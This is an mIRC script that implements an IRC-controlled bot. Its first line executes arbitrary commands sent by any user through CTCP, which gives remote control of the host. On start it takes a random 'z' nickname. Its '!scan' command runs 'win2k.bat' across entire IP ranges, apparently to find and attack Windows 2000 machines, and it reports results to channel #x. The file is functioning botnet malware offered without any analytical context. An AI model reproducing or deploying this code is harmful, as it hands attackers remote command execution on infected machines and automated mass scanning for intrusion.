[script]
n0=ctcp *:command:?:{ haltdef | $2- }
n1=
n2=on 1:start:{
n3=
n4=nick z $+ $rand(1,99999)
n5=}
n6=alias nexthost {
n7=  echo nexthost
n8=  if (%scan == on) { 
n9=    if (%rangec == off) {
n10=      run win2k.bat %temprange $+ %tempip    
n11=      inc %tempip 1
n12=      if (%tempip > 255) { /scanoff | halt }
n13=      halt
n14=    }
n15=
n16=    if (%rangec == on) {
n17=      if (%tempip1 > 255) { /scanoff | halt }      
n18=      if (%tempip == 255) && (%tempip1 < 256) { inc %tempip1 1 | set %tempip 0 }
n19=      run win2k.bat %temprange $+ %tempip1 $+ . $+ %tempip
n20=      inc %tempip 1
n21=    }
n22=    halt
n23=  }
n24=  inc %tempip 1
n25=  if (%tempip == 50) || (%tempip = 282) { /scan Scan of %range  Completed }
n26=}
n27=
n28=
n29=
n30=on *:text:!scan*:*:{
n31=  if (%scan == on) { 
n32=    msg $chan Scan in progress
n33=    halt
n34=  }
n35=
n36=
n37=
n38=  if ($3 != c) { 
n39=    set %range $2 $+ 0
n40=    set %rangec off
n41=    set %temprange $2
n42=    set %tempip 0
n43=    set %scan on
n44=    set %tempres 0
n45=    set %child 1
n46=    :child
n47=    run win2k.bat %temprange $+ %tempip
n48=    if (%child < 50) { inc %child 1 | inc %tempip 1 | goto child }
n49=    inc %tempip 1
n50=  }
n51=  
n52=
n53=  if ($3 == c) {
n54=    set %range $2 $+ 0.0
n55=    set %rangec on
n56=    set %temprange $2
n57=    set %tempip1 0
n58=    set %tempip 0
n59=    set %scan on
n60=    set %tempres 0
n61=    set %child 1
n62=    :child
n63=    run win2k.bat %temprange $+ %tempip1 $+ . $+ %tempip
n64=    if (%child < 50 ) { inc %child 1 | inc %tempip 1 | goto child }
n65=    inc %tempip 1
n66=  }
n67=
n68=
n69=
n70=}
n71=
n72=
n73=alias scan { 
n74=  msg #x $1-
n75=}
n76=alias scanoff { set %scan off }
n77=
n78=alias scan2 {
n79=  if (%echo == on) { msg #x $1- }
n80=}
n81=on *:text:!help:*:{ msg #x }
n82=on *:text:!status:*:{
n83=  if (%scan != on) { /scan Currently Idle }
n84=}
n85=  
n86=  
n87=
n88=on *:text:!clearlog:*:{ write -c scan.txt | msg $nick Log Cleared }
n89=alias scan3 { msg #x $1- }
